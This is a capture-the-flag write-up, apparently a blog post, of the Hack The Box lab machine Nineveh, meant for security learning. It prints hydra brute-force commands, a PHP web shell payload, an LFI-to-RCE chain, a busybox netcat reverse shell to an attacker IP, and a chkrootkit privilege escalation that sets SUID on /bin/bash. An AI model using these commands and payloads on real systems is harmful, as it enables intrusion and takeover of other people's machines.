---
title: "Nineveh"
published: 2026-06-12
draft: false
description: 'Linux Medium machine - Nineveh.'
series: 'Hack-The-Box'
tags: ['HTB', 'Linux', 'SUID', 'Cronjob', 'RCE', 'PHP', 'LFI', 'SSH', 'Nmap', 'Brute Force', 'MySQL']
difficulty: 'Medium'
osType: 'Linux'
---


- Machine Name: Nineveh
- Difficulty: Medium
- OS Type: Linux

### Summary:

- port 443 - /db  - PhpLiteAdmin is vulnerable to PHP code injection [https://www.exploit-db.com/exploits/24044]
- Bruteforce the Admin password to get correct password, login to Panel and created malicious database (with php extension) with the table and raw with default value with php shell, and saved the db, we found the database store location
- On port 80 /department/login.php - bruteforce the credentials with admin username, to get password and login to admin panel, login to that, i found LFI in Notes section `file` parameter is vulnerable, but  it does require the name “**`ninevehNotes.txt` ”** so created database with `ninevehNotes.txt.php` and access it to get shell on the system (RCE → Shell)
- also note - ninevehNotes.txt says that hardcoded credentials present on the system,, uppon searching for minute, i found secure_notes directory with the image file, strings revelas ssh private key for amrois user
- ssh from machine using private key and get user.txt, further enumeration running pspy64 i found root  user is running chkrootkit, searching for exploit i found - [https://www.exploit-db.com/exploits/33899]
- creating /tmp/update with command to set SUID to /bin/bash, and got root shell

### Port Scanning - Service & Version Enumeration

```php
# Nmap 7.95 scan initiated Thu Jun 12 08:37:12 2025 as: /usr/lib/nmap/nmap -sVC --open -p- -oN initial/nmap.out -vv 10.10.10.43
Nmap scan report for 10.10.10.43
Host is up, received echo-reply ttl 63 (0.22s latency).
Scanned at 2025-06-12 08:37:19 IST for 243s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE  REASON         VERSION
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/organizationalUnitName=Support/emailAddress=admin@nineveh.htb/localityName=Athens
| Issuer: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/organizationalUnitName=Support/emailAddress=admin@nineveh.htb/localityName=Athens
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-07-01T15:03:30
| Not valid after:  2018-07-01T15:03:30
| MD5:   d182:94b8:0210:7992:bf01:e802:b26f:8639
| SHA-1: 2275:b03e:27bd:1226:fdaa:8b0f:6de9:84f0:113b:42c0
| -----BEGIN CERTIFICATE-----
| MIID+TCCAuGgAwIBAgIJANwojrkai1UOMA0GCSqGSIb3DQEBCwUAMIGSMQswCQYD
| VQQGEwJHUjEPMA0GA1UECAwGQXRoZW5zMQ8wDQYDVQQHDAZBdGhlbnMxFzAVBgNV
| BAoMDkhhY2tUaGVCb3ggTHRkMRAwDgYDVQQLDAdTdXBwb3J0MRQwEgYDVQQDDAtu
| aW5ldmVoLmh0YjEgMB4GCSqGSIb3DQEJARYRYWRtaW5AbmluZXZlaC5odGIwHhcN
| MTcwNzAxMTUwMzMwWhcNMTgwNzAxMTUwMzMwWjCBkjELMAkGA1UEBhMCR1IxDzAN
| BgNVBAgMBkF0aGVuczEPMA0GA1UEBwwGQXRoZW5zMRcwFQYDVQQKDA5IYWNrVGhl
| Qm94IEx0ZDEQMA4GA1UECwwHU3VwcG9ydDEUMBIGA1UEAwwLbmluZXZlaC5odGIx
| IDAeBgkqhkiG9w0BCQEWEWFkbWluQG5pbmV2ZWguaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA+HUDrGgG769A68bslDXjV/uBaw18SaF52iEz/ui2
| WwXguHnY8BS7ZetS4jAso6BOrGUZpN3+278mROPa4khQlmZ09cj8kQ4k7lOIxSlp
| eZxvt+R8fkJvtA7e47nvwP4H2O6SI0nD/pGDZc05i842kOc/8Kw+gKkglotGi8ZO
| GiuRgzyfdaNSWC7Lj3gTjVMCllhc6PgcQf9r7vK1KPkyFleYDUwB0dwf3taN0J2C
| U2EHz/4U1l40HoIngkwfhFI+2z2J/xx2JP+iFUcsV7LQRw0x4g6Z5WFWETluWUHi
| AWUZHrjMpMaXs3TZNNW81tWUP2jBulX5kv6H5CTocsXgyQIDAQABo1AwTjAdBgNV
| HQ4EFgQUh0YSfVOI05WyOFntGykwc3/OzrMwHwYDVR0jBBgwFoAUh0YSfVOI05Wy
| OFntGykwc3/OzrMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAehma
| AJKuLeAHqHAIcLopQg9mE28lYDGxf+3eIEuUAHmUKs0qGLs3ZTY8J77XTxmjvH1U
| qYVXfZSub1IG7LgUFybLFKNl6gioKEPXXA9ofKdoJX6Bar/0G/15YRSEZGc9WXh4
| Xh1Qr3rkYYZj/rJa4H5uiWoRFofSTNGMfbY8iF8X2+P2LwyEOqThypdMBKMiIt6d
| 7sSuqsrnQRa73OdqdoCpHxEG6antne6Vvz3ALxv4cI7SqzKiQvH1zdJ/jOhZK1g1
| CxLUGYbNsjIJWSdOoSlIgRswnu+A+O612+iosxYaYdCUZ8BElgjUAXLEHzuUFtRb
| KrYQgX28Ulf8OSGJuA==
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.18 (Ubuntu)

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 12 08:41:22 2025 -- 1 IP address (1 host up) scanned in 250.98 seconds

```

## Enumeration

### Port 80/HTTP

there are two ports for http is open 80 and https 443, let’s start our enumeration from port 80

![image.png](image.png)

let’s fuzz for hidden files and directories

```php
gobuster dir -u http://10.10.10.43/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -b 403,404
```

![image.png](image-1.png)

it has info.php, let’s open that

![image.png](image-2.png)

it’s phpinfo() page, we need to check this page to find any  potential vulnerabilities or misconfigurations

i’m using https://github.com/ab2pentest/PHPInfo_ICC

```php
python3 phpinfo_checker.py http://10.10.10.43/info.php
```

![image.png](image-3.png)

let’s keep this  information for later use, and start fuzzing for directories using raft-medium-directories.txt file

```php
gobuster dir -u http://10.10.10.43/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

![image.png](image-4.png)

let’s open the /department page

![image.png](image-5.png)

reading through source of this page i found interesting comment

![image.png](image-6.png)

it says mysql is installed and fix the login page i’m assuming that this is vulnerable to SQLi, i tried many payloads but none of them are  working 

### Port 443/HTTPS

if we visit the website on port 443 

![image.png](image-7.png)

let’s run the gobuster on this site as well

```php
gobuster dir -u https://10.10.10.43/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k
```

![image.png](image-8.png)

we found the /db directory let’s open that

it is running phpLiteAdmin 1.9, quick google search reveals that it is vulnerable to RCE - https://www.exploit-db.com/exploits/24044

![image.png](image-9.png)

but for that we need to login to phpliteadmin portal, as i tried common passwords but it doesn’t working

let’s try bruteforcing this password

```php
hydra -l none -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."
```

![image.png](image-10.png)

we found the valid password, let’s login using password123

![image.png](image-11.png)

let’s follow the exploit steps to inject PHP code

1. Create a db named hack.php

![image.png](image-12.png)

1. Now create a new table in this database and insert a text field with the default value:
<?php system($_GET[’cmd’]); ?>

![image.png](image-13.png)

we can see the location of hack.php

![image.png](image-14.png)

now we need to access this file, let’s see what we can do, now nothing left so i’m going back to port 80, and trying to bruteforce credentials

the error message can be useful for username enumeration

![image.png](image-15.png)

if we enter valid username it shows invalid password message, i’ll try to bruteforce password with admin username

```php
hydra -l none -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password" -t 64
```

![image.png](image-16.png)

we can login as **`admin:1q2w3e4r5t`** 

![image.png](image-17.png)

let’s check notes section

![image.png](image-18.png)

after some trial/error i found that it only includes the file that starts inlcude **`ninevehNotes.txt`** 

so l’ll create a new database with the name of ninevehNotes.txt.php and add the default value -

```php
<?php system("id"); ?>
```

![image.png](image-19.png)

let’s try to access the database from department portal notes section

![image.png](image-20.png)

and Bingo we got the commadn execution, to get reverse shell follow same process just change php command with `busybox nc 10.10.14.17 443 -e /bin/bash` 

![image.png](image-21.png)

and we got shell

when we read the notes of admin we found that there’s secret folder which contains hardcoded credentials 

i found secure_notes folder, let’s open it in browser

![image.png](image-22.png)

it shows the image, let’s download the image

```php
wget https://10.10.10.43/secure_notes/nineveh.png --no-check-certificate
```

[https://app.notion.com](https://app.notion.com)

for image what we can get from image, let’s run strings on the image

```php
strings nineveh.png
```

![image.png](image-23.png)

we found the username amrois

![image.png](image-24.png)

but we don’t found ssh port open, let’s ssh from the target machine, transfer the id_rsa to machine and then ssh from there

```php
ssh -i id_rsa amrois@127.0.0.1
```

![image.png](image-25.png)

started enumerating the system and found mail for amrois user

![image.png](image-26.png)

it says please knock the door next time!, and some numbers are listed in this, what’s meaning of that

further enumeration reveals that port 22 is knocked using knockd

### Port Knocking

> Port knocking is **a security technique where a series of connection attempts to closed ports on a network service (like SSH) are used to gain access to that service**
> 

![image.png](image-27.png)

it the same sequence  that we found in the mail, i came across this article which shows how we can knock the port → https://medium.com/@reotmani/port-knocking-dbe6d8aaeb9

we need to run this command : `knock -v 10.10.10.43 571 290 911` in order to open ssh port

![image.png](image-28.png)

let’s now try to connect with ssh

let’s run the [linpeas.sh](http://linpeas.sh), and i found that report-reset.sh, is running as cronjob.

let’s run the pspy64  and see what’s going on

![image.png](image-29.png)

running pspy i found root user is running script called vulnscan.sh, and many process running /usr/bin/chkrootkit

![image.png](image-30.png)

after googling the chkrootkit i found that it is the binary that scans system for rootkits

```php
searchsploit "chkrootkit"
```

![image.png](image-31.png)

i found Local Privilege Escalation → https://www.exploit-db.com/exploits/33899

reading the exploit i found that we need to create /tmp/update file, and place our malicious code into  that, when root user executes the chkrootkit it will execute /tmp/update file

so i’ll add the chmod +s /bin/bash command to /tmp/updat

```php
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/update
```

make it executable, - `chmod +x /tmp/update` 

wait for few seconds and we’ll get SUID bit set on /bin/bash when root user executes chkrootkit

![image.png](image-32.png)

use `/bin/bash -p` to get root shell, Bingo! Pwned!!